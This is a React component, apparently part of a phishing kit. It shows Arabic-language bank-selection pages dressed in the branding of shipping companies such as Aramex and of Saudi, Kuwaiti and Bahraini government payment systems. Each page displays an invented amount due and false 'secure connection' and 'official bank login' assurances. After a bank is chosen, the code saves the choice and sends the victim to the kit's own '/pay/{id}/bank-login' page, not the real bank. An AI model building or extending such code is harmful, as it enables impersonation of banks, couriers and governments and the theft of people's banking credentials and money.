import React, { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Building2, Loader2, Sparkles, ShieldCheck, Lock, CheckCircle2 } from "lucide-react";
import { designSystem } from "@/lib/designSystem";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { getGovernmentLayout } from "@/components/GovernmentLayouts";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [selectedBank, setSelectedBank] = useState<string>("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  
  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  const govSystem = getGovernmentPaymentSystem(countryCode);
  const preselectedBank = linkData?.payload?.selected_bank;
  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;

  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
  const formattedAmount = formatCurrency(amount, currencyCode);
  
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      setTimeout(() => {
        const countryBanks = getBanksByCountry(countryCode);
        setBanks(countryBanks);
        setLoadingBanks(false);
        if (preselectedBank) setSelectedBank(preselectedBank);
      }, 300);
    }
  }, [countryCode, preselectedBank]);
  
  const handleBankSelect = async (bankId: string) => {
    setSelectedBank(bankId);
    if (!linkData) return;
    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: { ...linkData.payload, selectedCountry: countryCode, selectedBank: bankId }
      });
    } catch (error) {}
    setTimeout(() => navigate(`/pay/${id}/bank-login`), 400);
  };
  
  if (linkLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center" dir="rtl">
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
          <p>جاري تحميل البيانات...</p>
        </div>
      </div>
    );
  }
  
  const primaryColor = companyBranding?.colors.primary || govSystem.colors.primary;
  const secondaryColor = companyBranding?.colors.secondary || govSystem.colors.secondary;

  const renderBankSelector = () => (
    <div className="space-y-8">
      <div className="text-center">
        <div className="flex items-center justify-center gap-2 mb-3">
          <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
          <h2 className="text-2xl sm:text-3xl font-bold">اختر بنكك للمتابعة</h2>
        </div>
        <p className="text-gray-600">اختر البنك الخاص بك للانتقال إلى صفحة تسجيل الدخول الآمنة</p>
      </div>

      <div className="max-w-2xl mx-auto p-4 rounded-xl border flex items-start gap-3 bg-blue-50 border-blue-100">
        <Lock className="w-5 h-5 mt-0.5 text-blue-600" />
        <div>
          <p className="text-sm font-semibold text-blue-900">🔐 معلومة أمنية هامة</p>
          <p className="text-xs text-blue-700">سيتم تحويلك إلى صفحة تسجيل الدخول الرسمية للبنك. لا تشارك بياناتك المصرفية مع أي شخص.</p>
        </div>
      </div>

      {loadingBanks ? (
        <div className="text-center py-12">
          <Loader2 className="w-10 h-10 animate-spin mx-auto mb-4" style={{ color: primaryColor }} />
          <p className="text-gray-600">جاري تحميل البنوك المتاحة...</p>
        </div>
      ) : (
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4">
          {banks.map((bank) => (
            <button
              key={bank.id}
              className="group relative transition-all duration-200 rounded-xl"
              onClick={() => handleBankSelect(bank.id)}
            >
              <div 
                className="relative overflow-hidden bg-white p-4 transition-all duration-300 flex flex-col items-center hover:shadow-xl"
                style={{
                  borderRadius: '12px',
                  border: selectedBank === bank.id ? `3px solid ${bank.color || primaryColor}` : `2px solid #E2E8F0`,
                  transform: selectedBank === bank.id ? 'translateY(-4px) scale(1.05)' : 'none',
                }}
              >
                {selectedBank === bank.id && (
                  <div className="absolute top-2 right-2 w-7 h-7 rounded-full flex items-center justify-center shadow-lg z-10 bg-white">
                    <CheckCircle2 className="w-5 h-5" style={{ color: bank.color || primaryColor }} />
                  </div>
                )}
                <div className="w-16 h-16 sm:w-20 sm:h-20 flex items-center justify-center mb-3">
                  <BankLogo bankId={bank.id} bankName={bank.name} bankNameAr={bank.nameAr} color={bank.color} size="lg" />
                </div>
                <p className="text-xs sm:text-sm font-bold text-center line-clamp-2">{bank.nameAr}</p>
              </div>
            </button>
          ))}
        </div>
      )}
    </div>
  );
  
  const isShipping = linkData.type === 'shipping';
  
  return (
    <div 
      className="min-h-screen flex flex-col" 
      dir="rtl"
      style={{
        background: `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`,
        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
      }}
    >
      {(() => {
        if (isShipping) {
          const Layout = getCompanyLayout(serviceKey);
          return (
            <Layout 
              companyKey={serviceKey} 
              amount={formattedAmount} 
              trackingNumber={shippingInfo?.tracking_number || `TRK-${id?.substring(0, 8).toUpperCase()}`}
            >
              {renderBankSelector()}
            </Layout>
          );
        }

        if (countryCode === 'SA' || countryCode === 'KW' || countryCode === 'BH') {
          const Layout = getGovernmentLayout(countryCode);
          return (
            <Layout 
              countryCode={countryCode} 
              amount={formattedAmount} 
              serviceName={serviceName}
            >
              {renderBankSelector()}
            </Layout>
          );
        }

        return (
          <>
            <div className="w-full py-6 px-4 shadow-md bg-white" style={{ borderBottom: `3px solid ${primaryColor}` }}>
              <div className="container mx-auto max-w-6xl flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-12 h-12 rounded-full flex items-center justify-center" style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}>
                    <Building2 className="w-6 h-6 text-white" />
                  </div>
                  <div>
                    <h1 className="text-xl sm:text-2xl font-bold">اختيار البنك</h1>
                    <p className="text-sm text-gray-500">الخدمات المصرفية الآمنة</p>
                  </div>
                </div>
                <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
                  <ShieldCheck className="w-4 h-4 text-green-600" />
                  <span className="text-xs font-medium text-green-700">اتصال آمن</span>
                </div>
              </div>
            </div>
            <div className="flex-1 py-8 sm:py-12">
              <div className="container mx-auto px-4 max-w-5xl">
                {renderBankSelector()}
              </div>
            </div>
          </>
        );
      })()}
    </div>
  );
};

export default PaymentBankSelector;
